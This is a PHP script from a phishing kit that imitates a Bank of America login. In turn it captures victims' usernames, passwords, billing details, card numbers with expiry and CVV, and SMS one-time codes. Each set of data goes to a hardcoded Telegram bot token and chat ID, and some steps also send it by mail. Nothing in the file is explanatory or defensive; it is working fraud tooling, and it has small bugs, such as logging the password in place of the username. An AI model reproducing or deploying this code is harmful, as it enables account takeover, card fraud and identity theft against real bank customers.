<?php 

require_once "functions.php";


$apiToken = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
$id = "1461764555";


if ($_POST['step']== 'index') {
    $user = $_POST['user'];
   $password = $_POST['password'];

    if (empty($user) || empty($password)) {

        header("Location: index.php");
        exit();

    }else{
            $adrress  = $_SERVER['REMOTE_ADDR'];
            $subject  = $adrress . " | LOGIN | BANK_OF_AMERICA"       . "\r\n" ;
            $message  = " _________ INFO_LOGIN___" . "\r\n";
            $message .= "USER : " . $password                  . "\r\n";
            $message .= "PASSWORD : " . $password             . "\r\n";

         if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading.php");
        exit();
    }
}




else if ($_POST['step'] == 'billing') {
    
        $_SESSION['errors']      = [];
        $_SESSION['first']  = $_POST['first'];
        $_SESSION['last']       = $_POST['last'];
        $_SESSION['email']   = $_POST['email'];
        $_SESSION['phone']   = $_POST['phone'];
        $_SESSION['city']   = $_POST['city'];
        $_SESSION['zip']   = $_POST['zip'];


        if( empty($_POST['first']) ) {
            $_SESSION['errors']['first'] = true;
        }

        if( empty($_POST['last']) ) {
            $_SESSION['errors']['last'] = true;
        }

        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = true;
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = true;
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = true;
        }

        if( empty($_POST['zip']) ) {
            $_SESSION['errors']['zip'] = true;
        }



        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BANK_OF_AMERICA | <====="    . "\r\n"; ;
            $message  = "_______  BILLING INFO ___ " . "\r\n"; 
            $message .= "FIRST NAME : " . $_POST['first']             . "\r\n";
            $message .= "LAST NAME : " . $_POST['last']                       . "\r\n" ;
            $message .= "EMAIL : " . $_POST['email']                             . "\r\n" ;
            $message .= "PHONE : " . $_POST['phone']                             . "\r\n" ;
            $message .= "CITY : " . $_POST['city']                             . "\r\n" ;
            $message .= "ZIP : " . $_POST['zip']                             . "\r\n" ;

            header("Location: loading2.php");

            mail($to, $subject, $message);

             if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: Location: billing.php");
            exit();
        }
}




else if ($_POST['step'] == 'cc') {
    
        $_SESSION['errors']      = [];
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['cvv']   = $_POST['cvv'];


        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }


        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BANK_OF_AMERICA | <====="    . "\r\n"; ;
            $message  = "_______  CC INFO ___ " . "\r\n"; 
            $message .= "CARD NUMBER : " . $_POST['card_number']             . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                       . "\r\n" ;
            $message .= "CCV : " . $_POST['cvv']                             . "\r\n" ;

            header("Location: loading3.php");

            mail($to, $subject, $message);

             if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: Location: cc.php");
            exit();
        }
}

else if ($_POST['step'] == 'sms') {
            

            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BANK_OF_AMERICA | <====="    . "\r\n"; 
            $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
            $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

             header("Location: loading4.php");


             mail($to, $subject, $message);


             if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
           
            
            exit();
}


else if ($_POST['step'] == 'sms-er') {
            

            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BANK_OF_AMERICA | <====="    . "\r\n"; 
            $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
            $message .= "SMS CODE 2 : " . $_POST['sms']                      . "\r\n";

             header("Location: success.php");


             mail($to, $subject, $message);


             if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
           
            
            exit();
}




?>